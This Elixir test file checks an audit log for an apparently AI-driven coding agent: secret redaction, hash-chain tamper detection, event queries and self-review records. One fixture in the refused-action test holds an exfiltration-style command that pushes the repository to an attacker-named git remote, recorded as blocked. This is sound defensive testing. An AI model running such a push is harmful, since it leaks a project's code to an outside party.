defmodule SymphonyElixir.AuditLogTest do
  use SymphonyElixir.TestSupport

  alias SymphonyElixir.AuditLog

  @linear_secret "linear-secret-123456"
  @gh_secret "gho-secret-123456"
  @github_secret "ghp-secret-123456"

  setup do
    test_root =
      Path.join(
        System.tmp_dir!(),
        "symphony-audit-log-#{System.unique_integer([:positive])}"
      )

    audit_dir = Path.join(test_root, "audit")
    previous_linear_api_key = System.get_env("LINEAR_API_KEY")
    previous_gh_token = System.get_env("GH_TOKEN")
    previous_github_token = System.get_env("GITHUB_TOKEN")
    previous_audit_dir = Application.get_env(:symphony_elixir, :audit_log_dir)

    System.put_env("LINEAR_API_KEY", @linear_secret)
    System.put_env("GH_TOKEN", @gh_secret)
    System.put_env("GITHUB_TOKEN", @github_secret)
    Application.put_env(:symphony_elixir, :audit_log_dir, audit_dir)
    write_workflow_file!(Workflow.workflow_file_path(), tracker_api_token: "$LINEAR_API_KEY")

    on_exit(fn ->
      restore_env("LINEAR_API_KEY", previous_linear_api_key)
      restore_env("GH_TOKEN", previous_gh_token)
      restore_env("GITHUB_TOKEN", previous_github_token)
      restore_app_env(:audit_log_dir, previous_audit_dir)
      File.rm_rf(test_root)
    end)

    {:ok, audit_dir: audit_dir}
  end

  test "writes append-only redacted NDJSON and lists by issue/date", %{audit_dir: audit_dir} do
    timestamp = ~U[2026-05-07 12:00:00Z]
    issue = %Issue{id: "issue-1", identifier: "RSM-1"}
    prompt = "Handle this issue with #{@linear_secret} but do not leak it."

    assert :ok =
             AuditLog.record_prompt_sent(issue, "run-1", prompt,
               timestamp: timestamp,
               dir: audit_dir
             )

    assert :ok =
             AuditLog.record(
               %{
                 issue_id: "issue-2",
                 run_id: "run-2",
                 timestamp: timestamp,
                 event_type: "tool_call",
                 args: %{"api_key" => @linear_secret}
               },
               dir: audit_dir
             )

    path = Path.join(audit_dir, "2026-05-07.ndjson")
    contents = File.read!(path)
    lines = String.split(contents, "\n", trim: true)

    assert length(lines) == 2
    refute contents =~ @linear_secret
    assert Enum.all?(Enum.map(lines, &Jason.decode!/1), &(&1["repo_key"] == "default"))

    assert {:ok, [%{"event_type" => "prompt_sent"} = event]} =
             AuditLog.list_events("issue-1", ~D[2026-05-07], ~D[2026-05-07], dir: audit_dir)

    assert event["repo_key"] == "default"
    assert event["run_id"] == "run-1"
    assert event["prompt_preview"] =~ "[REDACTED]"
    assert String.length(event["prompt_hash"]) == 64
    refute Map.has_key?(event, "prompt")
    assert is_binary(event["record_hash"])
    assert {:ok, 2} = AuditLog.verify_file(path)
  end

  test "redacts common GitHub token env values from command output", %{audit_dir: audit_dir} do
    timestamp = ~U[2026-05-07 12:00:00Z]

    assert :ok =
             AuditLog.record(
               %{
                 issue_id: "issue-1",
                 run_id: "run-1",
                 timestamp: timestamp,
                 event_type: "tool_call",
                 result: %{
                   "output" => "GH_TOKEN=#{@gh_secret}\nGITHUB_TOKEN=#{@github_secret}"
                 }
               },
               dir: audit_dir
             )

    path = Path.join(audit_dir, "2026-05-07.ndjson")
    contents = File.read!(path)

    refute contents =~ @gh_secret
    refute contents =~ @github_secret
    assert contents =~ "[REDACTED]"
  end

  test "keeps GH_TOKEN canary literal unredacted when no value is present in output", %{audit_dir: audit_dir} do
    timestamp = ~U[2026-05-07 12:00:00Z]

    assert :ok =
             AuditLog.record(
               %{
                 issue_id: "issue-1",
                 run_id: "run-1",
                 timestamp: timestamp,
                 event_type: "tool_call",
                 command: "printf '%s\\n' '$GH_TOKEN'",
                 result: %{"output" => "$GH_TOKEN\n"}
               },
               dir: audit_dir
             )

    path = Path.join(audit_dir, "2026-05-07.ndjson")
    contents = File.read!(path)

    assert contents =~ "$GH_TOKEN"
    refute contents =~ "GH_TOKEN=[REDACTED]"
  end

  test "lists events chronologically across date ranges", %{audit_dir: audit_dir} do
    assert :ok =
             AuditLog.record(
               %{
                 issue_id: "issue-1",
                 run_id: "run-1",
                 timestamp: ~U[2026-05-08 10:00:00Z],
                 event_type: "tool_call",
                 sequence: "second"
               },
               dir: audit_dir
             )

    assert :ok =
             AuditLog.record(
               %{
                 issue_id: "issue-1",
                 run_id: "run-1",
                 timestamp: ~U[2026-05-07 09:00:00Z],
                 event_type: "tool_call",
                 sequence: "first"
               },
               dir: audit_dir
             )

    assert {:ok, events} =
             AuditLog.list_events("issue-1", ~D[2026-05-07], ~D[2026-05-08], dir: audit_dir)

    assert Enum.map(events, & &1["sequence"]) == ["first", "second"]
  end

  test "queries filtered redacted events as a stream", %{audit_dir: audit_dir} do
    assert :ok =
             AuditLog.record(
               %{
                 repo_key: "default",
                 issue_id: "issue-1",
                 issue_identifier: "RSM-1",
                 run_id: "run-1",
                 timestamp: ~U[2026-05-07 09:00:00Z],
                 event_type: "tool_call",
                 args: %{"api_key" => @linear_secret}
               },
               dir: audit_dir
             )

    assert :ok =
             AuditLog.record(
               %{
                 repo_key: "other",
                 issue_id: "issue-2",
                 issue_identifier: "RSM-2",
                 run_id: "run-2",
                 timestamp: ~U[2026-05-07 10:00:00Z],
                 event_type: "file_change",
                 paths: ["lib/example.ex"]
               },
               dir: audit_dir
             )

    assert {:ok, stream} =
             AuditLog.query(%{
               "issue" => "RSM-1",
               "repo" => "default",
               "type" => "tool_call",
               "from" => "2026-05-07",
               "to" => "2026-05-07",
               "dir" => audit_dir
             })

    assert [%{"issue_id" => "issue-1", "args" => %{"api_key" => "[REDACTED]"}}] = Enum.to_list(stream)
  end

  test "query supports date and record-hash cursor pagination", %{audit_dir: audit_dir} do
    for sequence <- 1..3 do
      assert :ok =
               AuditLog.record(
                 %{
                   issue_id: "issue-1",
                   timestamp: ~U[2026-05-07 09:00:00Z],
                   event_type: "tool_call",
                   sequence: sequence
                 },
                 dir: audit_dir
               )
    end

    assert {:ok, first_page} =
             AuditLog.query(issue_id: "issue-1", from: "2026-05-07", to: "2026-05-07", limit: 2, dir: audit_dir)

    [first, second] = Enum.to_list(first_page)
    cursor = "#{second["date"]}:#{second["record_hash"]}"

    assert {:ok, second_page} =
             AuditLog.query(issue_id: "issue-1", from: "2026-05-07", to: "2026-05-07", cursor: cursor, dir: audit_dir)

    assert [%{"sequence" => 3}] = Enum.to_list(second_page)
    assert first["sequence"] == 1
  end

  test "records refused agent actions", %{audit_dir: audit_dir} do
    issue = %Issue{id: "issue-refused", identifier: "RSM-3010"}

    assert :ok =
             AuditLog.record_refused_agent_action(
               issue,
               %{
                 action: "git_push",
                 reason: "git_remote_not_allowed",
                 command: "git push git@github.com:attacker/x.git HEAD",
                 details: %{target: "git@github.com:attacker/x.git"}
               },
               timestamp: ~U[2026-05-13 07:00:00Z],
               dir: audit_dir,
               repo_key: "default"
             )

    assert {:ok, [%{"event_type" => "refused_agent_action"} = event]} =
             AuditLog.list_events("issue-refused", ~D[2026-05-13], ~D[2026-05-13], dir: audit_dir)

    assert event["issue_identifier"] == "RSM-3010"
    assert event["repo_key"] == "default"
    assert event["action"] == "git_push"
    assert event["reason"] == "git_remote_not_allowed"
    assert event["details"] == %{"target" => "git@github.com:attacker/x.git"}
  end

  test "verify_file detects edited records", %{audit_dir: audit_dir} do
    timestamp = ~U[2026-05-07 12:00:00Z]

    assert :ok =
             AuditLog.record(
               %{issue_id: "issue-1", run_id: "run-1", timestamp: timestamp, event_type: "tool_call"},
               dir: audit_dir
             )

    assert :ok =
             AuditLog.record(
               %{issue_id: "issue-1", run_id: "run-1", timestamp: timestamp, event_type: "file_change"},
               dir: audit_dir
             )

    path = Path.join(audit_dir, "2026-05-07.ndjson")
    tampered = path |> File.read!() |> String.replace("tool_call", "tool_call_edited", global: false)
    File.write!(path, tampered)

    assert {:error, {:hash_mismatch, 1}} = AuditLog.verify_file(path)
  end

  test "verify_chain returns ok for a clean day and break record after tamper", %{audit_dir: audit_dir} do
    timestamp = ~U[2026-05-07 12:00:00Z]

    assert :ok =
             AuditLog.record(
               %{issue_id: "issue-1", run_id: "run-1", timestamp: timestamp, event_type: "tool_call"},
               dir: audit_dir
             )

    assert :ok =
             AuditLog.record(
               %{issue_id: "issue-1", run_id: "run-1", timestamp: timestamp, event_type: "file_change"},
               dir: audit_dir
             )

    path = Path.join(audit_dir, "2026-05-07.ndjson")
    [first_line, second_line] = path |> File.read!() |> String.split("\n", trim: true)
    second = Jason.decode!(second_line)
    second_record_hash = second["record_hash"]

    assert :ok = AuditLog.verify_chain(~D[2026-05-07], dir: audit_dir)

    tampered_second =
      second
      |> Map.put("previous_hash", "tampered")
      |> Jason.encode!()

    File.write!(path, Enum.join([first_line, tampered_second], "\n") <> "\n")

    assert {:error, {:break_at, ^second_record_hash}} = AuditLog.verify_chain("2026-05-07", dir: audit_dir)
  end

  test "records tool, Linear, file-change, PR, and token side-effect events", %{audit_dir: audit_dir} do
    timestamp = ~U[2026-05-07 12:00:00Z]
    issue = %Issue{id: "issue-1", identifier: "RSM-1"}
    running_entry = %{issue: issue, run_id: "run-1", session_id: "thread-1-turn-1"}

    assert :ok =
             AuditLog.record_agent_update(
               running_entry,
               %{
                 event: :tool_call_completed,
                 timestamp: timestamp,
                 payload: %{
                   "method" => "item/tool/call",
                   "params" => %{
                     "tool" => "linear_graphql",
                     "arguments" => %{
                       "query" => "mutation CreateComment { commentCreate(input: {issueId: $issueId, body: $body}) { success comment { id url } } }",
                       "variables" => %{"issueId" => "linear-issue-1"}
                     }
                   }
                 },
                 result: %{
                   "success" => true,
                   "output" =>
                     Jason.encode!(%{
                       "data" => %{
                         "commentCreate" => %{
                           "comment" => %{"id" => "comment-1", "url" => "https://linear.test/comment-1"}
                         }
                       }
                     })
                 }
               },
               %{
                 input_tokens: 3,
                 output_tokens: 2,
                 total_tokens: 5,
                 input_reported: 3,
                 output_reported: 2,
                 total_reported: 5
               }
             )

    diff = """
    diff --git a/lib/example.ex b/lib/example.ex
    --- a/lib/example.ex
    +++ b/lib/example.ex
    @@
    -old
    +new
    """

    assert :ok =
             AuditLog.record_agent_update(
               running_entry,
               %{
                 event: :notification,
                 timestamp: DateTime.add(timestamp, 1, :second),
                 payload: %{"method" => "turn/diff/updated", "params" => %{"diff" => diff}}
               },
               %{input_tokens: 0, output_tokens: 0, total_tokens: 0}
             )

    assert :ok =
             AuditLog.record_pr_opened(Map.put(running_entry, :pull_request_url, nil), "https://github.com/acme/repo/pull/42",
               timestamp: DateTime.add(timestamp, 2, :second),
               dir: audit_dir
             )

    assert {:ok, events} =
             AuditLog.list_events("issue-1", ~D[2026-05-07], ~D[2026-05-07], dir: audit_dir)

    assert Enum.map(events, & &1["event_type"]) == [
             "tool_call",
             "linear_comment",
             "token_usage_delta",
             "file_change",
             "pr_opened"
           ]

    assert Enum.all?(events, &(&1["repo_key"] == "default"))
    assert Enum.find(events, &(&1["event_type"] == "linear_comment"))["comment_id"] == "comment-1"
    assert Enum.find(events, &(&1["event_type"] == "token_usage_delta"))["token_usage_delta"]["total_tokens"] == 5

    file_change = Enum.find(events, &(&1["event_type"] == "file_change"))
    assert file_change["paths"] == ["lib/example.ex"]
    assert file_change["diff_stats"] == %{"additions" => 1, "deletions" => 1, "files_changed" => 1}

    pr_opened = Enum.find(events, &(&1["event_type"] == "pr_opened"))

    assert pr_opened["pr"] == %{
             "number" => 42,
             "repo" => "acme/repo",
             "url" => "https://github.com/acme/repo/pull/42"
           }
  end

  test "records observed Linear state transitions", %{audit_dir: audit_dir} do
    previous = %Issue{id: "issue-1", identifier: "RSM-1", state: "In Progress"}
    refreshed = %Issue{id: "issue-1", identifier: "RSM-1", state: "In Review"}

    assert :ok =
             AuditLog.record_linear_state_transition(previous, refreshed, "run-1",
               timestamp: ~U[2026-05-07 12:00:00Z],
               dir: audit_dir
             )

    assert {:ok, [event]} =
             AuditLog.list_events("issue-1", ~D[2026-05-07], ~D[2026-05-07], dir: audit_dir)

    assert event["event_type"] == "linear_state_change"
    assert event["from_state"] == "In Progress"
    assert event["to_state"] == "In Review"
  end

  test "records self-review approve with truncation flag", %{audit_dir: audit_dir} do
    issue = %Issue{id: "issue-1", identifier: "RSM-1"}

    result = %{
      verdict: :approve,
      findings: [],
      advisory_notes: [%{category: :review_coverage_low, description: "Large file summarized."}],
      source: %{
        diff_truncated?: true,
        diff_line_count: 640,
        review_coverage: %{
          fully_reviewed_files: ["lib/a.ex"],
          summarized_files: ["lib/b.ex"],
          generated_lock_files: ["pnpm-lock.yaml"],
          adjacent_context_files: ["lib/a.ex"],
          adjacent_context_omitted_files: ["lib/b.ex"],
          validation_evidence_count: 3,
          reviewer_comment_count: 2,
          ci_context_included?: true
        }
      }
    }

    assert :ok =
             AuditLog.record_self_review(issue, "run-1", result,
               timestamp: ~U[2026-05-08 16:32:08Z],
               dir: audit_dir,
               round: 1
             )

    assert {:ok, [event]} =
             AuditLog.list_events("issue-1", ~D[2026-05-08], ~D[2026-05-08], dir: audit_dir)

    assert event["event_type"] == "self_review"
    assert event["verdict"] == "approve"
    assert event["findings_count"] == 0
    assert event["finding_categories"] == []
    assert event["diff_truncated"] == true
    assert event["diff_line_count"] == 640
    assert event["advisory_notes_count"] == 1
    assert event["advisory_note_categories"] == ["review_coverage_low"]
    assert event["fully_reviewed_files"] == ["lib/a.ex"]
    assert event["summarized_files"] == ["lib/b.ex"]
    assert event["generated_lock_files"] == ["pnpm-lock.yaml"]
    refute Map.has_key?(event, "omitted_files")
    assert event["adjacent_context_files"] == ["lib/a.ex"]
    assert event["adjacent_context_omitted_files"] == ["lib/b.ex"]
    assert event["validation_evidence_count"] == 3
    assert event["reviewer_comment_count"] == 2
    assert event["ci_context_included"] == true
    assert event["round"] == 1
    refute Map.has_key?(event, "fail_open_category")
  end

  test "records self-review request_changes with finding categories but not descriptions",
       %{audit_dir: audit_dir} do
    issue = %Issue{id: "issue-2", identifier: "RSM-2"}

    result = %{
      verdict: :request_changes,
      findings: [
        %{severity: :blocking, category: :scope_creep, description: "Unrelated config change."},
        %{severity: :blocking, category: :scope_creep, description: "Second scope creep finding."}
      ]
    }

    assert :ok =
             AuditLog.record_self_review(issue, "run-2", result,
               timestamp: ~U[2026-05-08 17:00:00Z],
               dir: audit_dir,
               round: 2
             )

    assert {:ok, [event]} =
             AuditLog.list_events("issue-2", ~D[2026-05-08], ~D[2026-05-08], dir: audit_dir)

    assert event["verdict"] == "request_changes"
    assert event["findings_count"] == 2
    assert event["finding_categories"] == ["scope_creep"]
    assert event["round"] == 2
    refute event |> Jason.encode!() |> String.contains?("Unrelated config change")
  end

  test "records self-review fail-open with category", %{audit_dir: audit_dir} do
    issue = %Issue{id: "issue-3", identifier: "RSM-3"}

    result = %{
      verdict: :approve,
      findings: [],
      fail_open_category: :provider_unavailable,
      fail_open_reason: :missing_anthropic_api_key
    }

    assert :ok =
             AuditLog.record_self_review(issue, "run-3", result,
               timestamp: ~U[2026-05-08 18:00:00Z],
               dir: audit_dir,
               round: 1
             )

    assert {:ok, [event]} =
             AuditLog.list_events("issue-3", ~D[2026-05-08], ~D[2026-05-08], dir: audit_dir)

    assert event["verdict"] == "approve"
    assert event["fail_open_category"] == "provider_unavailable"
    refute Map.has_key?(event, "diff_truncated")
  end

  describe "redact_for_log/2" do
    test "renders exception structs without raising" do
      error = %Req.TransportError{reason: :timeout}

      result = AuditLog.redact_for_log(error)

      assert is_binary(result)
      assert result =~ "Req.TransportError"
      assert result =~ "timeout"
    end

    test "redacts secrets nested inside struct fields" do
      error = %RuntimeError{message: "boom with #{@linear_secret} inside"}

      result = AuditLog.redact_for_log(error)

      refute result =~ @linear_secret
      assert result =~ "[REDACTED]"
      assert result =~ "RuntimeError"
    end
  end

  defp restore_app_env(key, nil), do: Application.delete_env(:symphony_elixir, key)
  defp restore_app_env(key, value), do: Application.put_env(:symphony_elixir, key, value)
end
